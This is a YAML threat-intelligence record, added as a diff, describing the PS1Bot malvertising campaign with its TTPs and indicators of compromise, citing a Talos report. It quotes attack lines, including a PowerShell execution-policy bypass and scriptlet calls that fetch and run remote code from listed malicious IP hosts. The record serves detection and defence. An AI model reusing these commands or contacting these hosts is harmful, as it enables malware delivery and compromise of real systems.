@@ -1,0 +1,42 @@
+description: Malicious script chain that downloads payloads, writes files, executes
+  PowerShell, captures keystrokes, and exfiltrates data.
+attribution: Unknown threat actor or APT group; no specific country identified.
+malware_families:
+- PS1Bot
+- ''
+TTPs:
+  processes: []
+  commandline: []
+  powershell:
+  - powershell.exe -ep bypass -file C:\\ProgramData\\ntu.p1
+  scripting_engine:
+  - GetObject("scriptlet:http://0xb5aea40c/kyc")
+  - GetObject("scriptlet:http://181.174.164.12/kyc")
+  - GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process")
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: ''
+    destination: '0xb5aea40c'
+    port: ''
+  - executable: ''
+    destination: 181.174.164.12
+    port: ''
+  file_activity:
+  - C:\\ProgramData\\ntu.p1
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ips:
+  - 181.174.164.12
+  domains: []
+  urls:
+  - http://0xb5aea40c/kyc
+  - http://181.174.164.12/kyc
+authors:
+- Edmund Brumaghin
+- Jordyn Dunk
+reference: https://blog.talosintelligence.com/ps1bot-malvertising-campaign
+date_of_publication: August 12, 2025
+file_creation_date: October 01, 2025
